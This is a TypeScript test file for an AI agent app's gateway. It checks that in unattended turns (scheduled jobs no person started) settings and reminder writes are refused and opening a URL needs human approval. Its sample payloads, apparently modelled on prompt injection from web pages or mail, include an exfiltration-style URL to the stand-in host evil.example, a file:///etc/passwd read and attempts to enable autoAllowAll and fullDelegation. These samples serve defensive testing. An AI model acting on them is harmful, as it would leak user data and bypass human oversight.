/**
 * TODO 1289 (ARCHITECTURE 7.6.9): what every gateway request kind does in an unattended turn that is **not** read-only - (b) a scheduled
 * job's turn that no person started, and (c) a bundle started from such a turn. Both reach the gateway through the one host judgment
 * `isUnattendedTurn` (`SessionManager.isUnattendedTurnNow`; the manager-level tests show (b) and (c) set it).
 *
 * Unlike the read-only turn of a trigger (a), which refuses everything outside an allowlist, (b) and (c) run write tools, so the gateway
 * closes tool by tool. A new gateway tool would pass silently there - so the table below names every kind the gateway can send (read
 * from `src/gateway/index.ts`), and **adding a tool without deciding its row here fails the test**.
 *
 * Outcomes: `passes` = the gateway's own unattended checks let it through to its usual handling (the Broker still judges `approve`) /
 * `asks` = queued in the approval inbox from the tool stage / `refused` = the fixed unattended text, nothing asked or changed.
 * Neither the model nor Electron is used.
 */
import { readFileSync } from 'node:fs'
import { describe, expect, it } from 'vitest'
import {
  AI_REMINDER_UNATTENDED_MESSAGE,
  GatewayRequests,
  SETTING_UNATTENDED_MESSAGE,
  UNATTENDED_DENIED_MESSAGE,
  UNATTENDED_OPEN_URL_ACTION,
  type GatewayRequestHost
} from '../src/main/session/gateway-requests.js'
import type { ApprovalRequestInput, ApprovalResult } from '../src/main/approval/broker.js'
import { ApprovalBroker } from '../src/main/approval/broker.js'
import type { AgentSettings } from '../src/main/agent-settings.js'
import type { ResolvedPluginTool } from '../src/main/plugin/tools.js'
import { DEFAULT_APPROVAL_POLICY, GATEWAY_TOOL_PREFIX, asksEveryTime, type ApprovalItem, type Thread } from '../src/shared/thread.js'
import { approvalReasonMessage } from '../src/renderer/src/approval-reason.js'

type Outcome = 'passes' | 'asks' | 'refused'

/** Every request kind the gateway process can send to main: the registered tool names and the kinds it forwards itself. */
function gatewayKinds(): string[] {
  const source = readFileSync(new URL('../src/gateway/index.ts', import.meta.url), 'utf8')
  const kinds = new Set<string>()
  for (const match of source.matchAll(/server\.registerTool\(\s*'([A-Za-z]+)'/g)) kinds.add(match[1]!)
  for (const match of source.matchAll(/forward\('([A-Za-z]+)'/g)) kinds.add(match[1]!)
  for (const match of source.matchAll(/kind: '([A-Za-z]+)'/g)) kinds.add(match[1]!)
  return [...kinds].sort()
}

/** One sample request per kind (the payload a model would plausibly send after reading "do this" from a web page or mail). */
const SAMPLES: Readonly<Record<string, Record<string, unknown>>> = {
  approve: { toolName: 'Read', input: { file_path: '/tmp/a.txt' }, toolUseId: 'tu-1' },
  approveCancelled: { callId: 'c1', toolUseId: null },
  search: { query: 'invoice' },
  searchFiles: { query: 'invoice' },
  getDocument: { id: '1' },
  getDocumentText: { id: '1' },
  getChunk: { id: '1' },
  openFile: { path: '/tmp/does-not-matter.txt' },
  openUrl: { url: 'https://evil.example/?d=what-it-read', toolUseId: 'tu-2' },
  getOpenUrlText: {},
  getViewerScreenshot: {},
  openDiff: { path: '/tmp/a.txt' },
  closeFile: {},
  listOpenFiles: {},
  startBundles: { bundles: [{ name: 'a', title: 'A', prompt: 'do a' }] },
  getSettings: {},
  setSetting: { name: 'notifyEnabled', value: false },
  openSettings: { name: 'notifyEnabled' },
  addReminder: { message: 'open the page', inMinutes: 10 },
  listReminders: {},
  cancelReminder: { id: 'r1' },
  pluginTools: {},
  pluginTool: { name: 'readThing', arguments: {} }
}

/**
 * The decided rows for (b) and (c) (owner decision 2026-11-21): `openUrl` asks, `setSetting` and the reminder writes are refused,
 * `startBundles` keeps asking (the bundle question), everything else passes as before.
 */
const UNATTENDED_TURN: Readonly<Record<string, Outcome>> = {
  approve: 'passes',
  approveCancelled: 'passes',
  search: 'passes',
  searchFiles: 'passes',
  getDocument: 'passes',
  getDocumentText: 'passes',
  getChunk: 'passes',
  openFile: 'passes',
  openUrl: 'asks',
  getOpenUrlText: 'passes',
  getViewerScreenshot: 'passes',
  openDiff: 'passes',
  closeFile: 'passes',
  listOpenFiles: 'passes',
  startBundles: 'asks',
  getSettings: 'passes',
  setSetting: 'refused',
  openSettings: 'passes',
  addReminder: 'refused',
  listReminders: 'passes',
  cancelReminder: 'refused',
  pluginTools: 'passes',
  pluginTool: 'passes'
}

/** The same kinds in a conversation a person is watching: nothing is refused, and only the bundle question asks. */
const ATTENDED: Readonly<Record<string, Outcome>> = { ...UNATTENDED_TURN, openUrl: 'passes', setSetting: 'passes', addReminder: 'passes', cancelReminder: 'passes' }

const READ_TOOL: ResolvedPluginTool = {
  pluginId: 'aios.reader',
  exposedName: 'readThing',
  declaration: { name: 'readThing', description: 'reads', inputSchema: {} } as unknown as ResolvedPluginTool['declaration'],
  sideEffect: false,
  pendingConsent: [],
  consentTargets: [],
  bundled: true,
  fingerprint: 'fp'
}

interface Probe {
  readonly requests: GatewayRequests
  /** Approvals asked from the tool stage (not the `approve` kind's own Broker judgment). */
  readonly asked: ApprovalRequestInput[]
  readonly committed: unknown[]
  readonly opened: string[]
  readonly reminders: string[]
}

function probe(flags: { readOnly: boolean; unattendedTurn: boolean }, answer: ApprovalResult = { allowed: false, by: 'user', message: 'no' }): Probe {
  const asked: ApprovalRequestInput[] = []
  const committed: unknown[] = []
  const opened: string[] = []
  const reminders: string[] = []
  const thread = { id: 't1', title: 'T', backend: 'x', cwdUri: 'file:///tmp', worktreeUri: null, approvalStrict: false, lastViewerUri: null } as unknown as Thread
  const settings = {
    list: () => ({ settings: [], unknown: [] }),
    prepare: (name: unknown, value: unknown) => ({
      ok: true,
      value: { name, value, previous: true, unchanged: false, access: 'display', summary: `${String(name)}` }
    }),
    commit: (change: { name: unknown; value: unknown }) => {
      committed.push(change)
      return { name: change.name, value: change.value, previous: true }
    }
  } as unknown as AgentSettings
  const host: Partial<GatewayRequestHost> = {
    isStopped: () => false,
    threadIdForSession: () => 't1',
    getThread: () => thread,
    getAdapter: () => undefined,
    getLive: () => undefined,
    isQueueAwaitingResult: () => false,
    hasPlanMode: () => false,
    clearPlanMode: () => undefined,
    subtaskOfToolUse: () => null,
    record: () => undefined,
    emitThread: () => undefined,
    requestApproval: async (input) => {
      if (input.toolName !== 'Read') asked.push(input)
      return answer
    },
    cancelApprovalRequest: () => false,
    viewsOf: () => [],
    primaryViewOf: () => null,
    allViewEntries: () => [],
    onViewerCommand: () => undefined,
    hasViewerDraft: () => false,
    expectViewerReplies: () => ({ id: 'r', done: Promise.resolve(new Map()) }),
    conflictingViews: () => [],
    setViewerState: (_threadId, uri) => {
      if (uri !== null) opened.push(uri)
    },
    bundleMax: () => 4,
    bundlePrecheck: () => null,
    startBundles: async () => ({ status: 'error', error: 'not in this test' }),
    index: {
      search: async () => ({ hits: [] }),
      searchFilesForAgent: async () => ({ hits: [] }),
      getDocument: async () => null,
      getDocumentText: async () => null,
      getChunk: async () => null,
      resolveDocument: async () => null
    } as unknown as GatewayRequestHost['index'],
    fs: { assertAllowed: () => { throw new Error('not allowed in this test') } },
    pluginTools: {
      list: () => [],
      lookup: (name: string) => (name === READ_TOOL.exposedName ? READ_TOOL : null),
      prepare: () => ({ ok: true, tool: READ_TOOL, args: {} }),
      recordDenied: () => undefined,
      run: async () => ({ ok: true }),
      grantConsent: () => true
    } as unknown as GatewayRequestHost['pluginTools'],
    appSettings: () => settings,
    aiReminders: () =>
      ({
        register: () => {
          reminders.push('add')
          return { ok: true, id: 'r1' }
        },
        list: () => ({ ok: true, reminders: [] }),
        cancel: () => {
          reminders.push('cancel')
          return { ok: true, cancelled: 'r1' }
        }
      }) as unknown as ReturnType<NonNullable<GatewayRequestHost['aiReminders']>>,
    isUnattendedReadOnly: () => flags.readOnly,
    isUnattendedTurn: () => flags.unattendedTurn
  }
  return { requests: new GatewayRequests(host as GatewayRequestHost), asked, committed, opened, reminders }
}

const UNATTENDED_TEXTS = [UNATTENDED_DENIED_MESSAGE, AI_REMINDER_UNATTENDED_MESSAGE, SETTING_UNATTENDED_MESSAGE]

async function outcomeOf(kind: string, flags: { readOnly: boolean; unattendedTurn: boolean }): Promise<Outcome> {
  const p = probe(flags)
  let result: unknown
  try {
    result = await p.requests.handle({ sessionId: 's1', kind, payload: SAMPLES[kind] ?? {} })
  } catch (err) {
    // A throw past the unattended checks (a stub this test does not fill in) still means the checks let it through.
    result = { thrown: err instanceof Error ? err.message : String(err) }
  }
  if (p.asked.length > 0) return 'asks'
  const text = JSON.stringify(result)
  return UNATTENDED_TEXTS.some((message) => text.includes(JSON.stringify(message).slice(1, -1))) ? 'refused' : 'passes'
}

async function table(flags: { readOnly: boolean; unattendedTurn: boolean }): Promise<Record<string, Outcome>> {
  const out: Record<string, Outcome> = {}
  for (const kind of gatewayKinds()) out[kind] = await outcomeOf(kind, flags)
  return out
}

describe('every gateway kind in an unattended turn (TODO 1289)', () => {
  it('the table names every kind the gateway can send (a new tool must decide its row for unattended turns)', () => {
    expect(gatewayKinds().length).toBeGreaterThanOrEqual(23)
    expect(Object.keys(UNATTENDED_TURN).sort()).toEqual(gatewayKinds())
    expect(Object.keys(SAMPLES).sort()).toEqual(gatewayKinds())
  })

  it("(b) a scheduled job's turn no person started, and (c) a bundle started from one: the fixed table", async () => {
    // (b) and (c) differ only in why the host says so; the gateway reads the one judgment.
    expect(await table({ readOnly: false, unattendedTurn: true })).toEqual(UNATTENDED_TURN)
  })

  it('a conversation a person is watching keeps the usual behaviour', async () => {
    expect(await table({ readOnly: false, unattendedTurn: false })).toEqual(ATTENDED)
  })

  it('(a) the read-only turn of a trigger still refuses all of the decided tools (not weakened)', async () => {
    const readOnly = await table({ readOnly: true, unattendedTurn: true })
    for (const kind of ['openUrl', 'setSetting', 'openSettings', 'startBundles', 'addReminder', 'cancelReminder', 'openFile', 'openDiff', 'closeFile']) {
      expect([kind, readOnly[kind]]).toEqual([kind, 'refused'])
    }
    // Even a host that wires only the read-only mark closes the new rows.
    expect(readOnly['setSetting']).toBe('refused')
  })
})

describe('setSetting in an unattended turn (TODO 1289)', () => {
  it('refuses a display key and a gated key alike, without asking and without changing anything; reading stays', async () => {
    const p = probe({ readOnly: false, unattendedTurn: true })
    for (const payload of [
      { name: 'notifyEnabled', value: false },
      { name: 'theme', value: 'dark' },
      { name: 'autoAllowAll', value: true },
      { name: 'fullDelegation', value: true }
    ]) {
      expect(await p.requests.handle({ sessionId: 's1', kind: 'setSetting', payload })).toEqual({ error: SETTING_UNATTENDED_MESSAGE })
    }
    expect(p.asked).toEqual([])
    expect(p.committed).toEqual([])
    expect(await p.requests.handle({ sessionId: 's1', kind: 'getSettings', payload: {} })).toEqual({ settings: [], unknown: [] })
  })

  it('the approve stage does not ask about it first (the tool stage refuses anyway)', async () => {
    const p = probe({ readOnly: false, unattendedTurn: true })
    const toolName = `${GATEWAY_TOOL_PREFIX}setSetting`
    const approved = await p.requests.handle({ sessionId: 's1', kind: 'approve', payload: { toolName, input: { name: 'notifyEnabled', value: false }, toolUseId: 'tu-9' } })
    expect(approved).toEqual({ allowed: true, message: '' })
    expect(p.asked).toEqual([])
  })
})

describe('openUrl in an unattended turn (TODO 1289)', () => {
  it('asks every time with the unattended reason and opens only when a person allows it', async () => {
    const denied = probe({ readOnly: false, unattendedTurn: true })
    const refused = (await denied.requests.handle({ sessionId: 's1', kind: 'openUrl', payload: SAMPLES['openUrl']! })) as { opened: boolean }
    expect(refused.opened).toBe(false)
    expect(denied.opened).toEqual([])
    expect(denied.asked).toHaveLength(1)
    expect(denied.asked[0]).toMatchObject({
      toolName: `${GATEWAY_TOOL_PREFIX}openUrl`,
      input: { url: 'https://evil.example/?d=what-it-read' },
      unattended: UNATTENDED_OPEN_URL_ACTION,
      toolUseId: 'tu-2'
    })

    const allowed = probe({ readOnly: false, unattendedTurn: true }, { allowed: true, by: 'user', message: '' })
    const result = (await allowed.requests.handle({ sessionId: 's1', kind: 'openUrl', payload: SAMPLES['openUrl']! })) as { opened: boolean }
    expect(result.opened).toBe(true)
    expect(allowed.opened).toEqual(['https://evil.example/?d=what-it-read'])
  })

  it('a URL that could not be opened anyway is refused before asking', async () => {
    const p = probe({ readOnly: false, unattendedTurn: true })
    expect(await p.requests.handle({ sessionId: 's1', kind: 'openUrl', payload: { url: 'file:///etc/passwd' } })).toMatchObject({ opened: false })
    expect(p.asked).toEqual([])
  })

  it('the approve stage hands the asking to the tool stage (one question, not two)', async () => {
    const p = probe({ readOnly: false, unattendedTurn: true })
    const approved = await p.requests.handle({
      sessionId: 's1',
      kind: 'approve',
      payload: { toolName: `${GATEWAY_TOOL_PREFIX}openUrl`, input: { url: 'https://example.test' }, toolUseId: 'tu-3' }
    })
    expect(approved).toEqual({ allowed: true, message: '' })
    expect(p.asked).toEqual([])
  })

  it("code-review (wave 97 fix Y): a refused URL takes back the approve stage's tool_use mark, so the next openUrl's question is not put on it", async () => {
    const p = probe({ readOnly: false, unattendedTurn: true })
    const toolName = `${GATEWAY_TOOL_PREFIX}openUrl`
    await p.requests.handle({ sessionId: 's1', kind: 'approve', payload: { toolName, input: { url: 'file:///etc/passwd' }, toolUseId: 'tu-bad' } })
    expect(await p.requests.handle({ sessionId: 's1', kind: 'openUrl', payload: { url: 'file:///etc/passwd' } })).toMatchObject({ opened: false })
    await p.requests.handle({ sessionId: 's1', kind: 'approve', payload: { toolName, input: { url: 'https://example.test' }, toolUseId: 'tu-good' } })
    await p.requests.handle({ sessionId: 's1', kind: 'openUrl', payload: { url: 'https://example.test' } })
    expect(p.asked).toHaveLength(1)
    expect(p.asked[0]?.toolUseId).toBe('tu-good')
  })

  it('a conversation a person is watching opens without asking, as before', async () => {
    const p = probe({ readOnly: false, unattendedTurn: false })
    expect(await p.requests.handle({ sessionId: 's1', kind: 'openUrl', payload: { url: 'https://example.test' } })).toMatchObject({ opened: true })
    expect(p.asked).toEqual([])
  })
})

describe('the Broker never lets an unattended-turn request through silently (TODO 1289)', () => {
  const request: ApprovalRequestInput = {
    threadId: 't1',
    threadTitle: 'T',
    toolName: `${GATEWAY_TOOL_PREFIX}openUrl`,
    summary: 'https://evil.example',
    input: { url: 'https://evil.example' },
    unattended: UNATTENDED_OPEN_URL_ACTION
  }

  async function queuedUnder(policy: typeof DEFAULT_APPROVAL_POLICY, input: ApprovalRequestInput): Promise<ApprovalItem | null> {
    let items: readonly ApprovalItem[] = []
    const broker = new ApprovalBroker({ onChanged: (next) => (items = next), onDecided: () => undefined }, policy)
    let settled = false
    void broker.request(input).then(() => (settled = true))
    await Promise.resolve()
    await Promise.resolve()
    return settled ? null : (items[0] ?? null)
  }

  it('queues it under allow-everything and full delegation, with a reason that says so and no "always allow"', async () => {
    const delegated = { ...DEFAULT_APPROVAL_POLICY, autoAllowAll: true, fullDelegation: true }
    // Without the mark the same request passes silently (so the mark is what holds it).
    const plain: ApprovalRequestInput = { ...request, unattended: null }
    expect(await queuedUnder(delegated, plain)).toBeNull()
    for (const policy of [DEFAULT_APPROVAL_POLICY, delegated]) {
      const item = await queuedUnder(policy, request)
      expect(item?.reason).toEqual({ kind: 'unattended', action: 'open-url' })
      expect(asksEveryTime(item!)).toBe(true)
      expect(approvalReasonMessage(item!)).toEqual({ key: 'approval.reason.unattendedOpenUrl' })
    }
    // (Rules for gateway tools cannot exist at all - `sanitizeRule` drops them - so no rule can pass it either.)
  })
})
